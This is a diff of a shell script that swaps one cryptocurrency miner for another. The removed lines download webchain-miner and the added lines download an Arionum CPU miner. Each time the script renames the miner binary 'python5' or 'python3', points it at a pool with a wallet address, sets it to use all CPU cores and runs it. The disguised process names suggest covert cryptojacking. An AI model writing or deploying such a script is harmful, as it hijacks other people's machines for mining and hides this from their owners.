@@ -26,10 +26,18 @@ exit
 fi
 
 
-wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
-tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python5
-rm config.json
-./python5 -o 42.119.159.78:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+set -x #echo on
+
+wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.8_ubuntu16_server.tar.gz
+tar -zxf ariocppminer_v0.9.8_ubuntu16_server.tar.gz
+echo "pool
+http://aropool.com/
+y2nNWENYMvLRiyfRXf1Hf2JCrKMVMyvzL38CTQgMPrEAohWn8RSYkpRjvxvwELepeBrEpa1pwJQSRtnKWfb746C
+`nproc`
+enhanced
+true
+`hostname`" > config.cfg
+mv ariocppminer_avx2 python3
+./python3
 
 exit 0
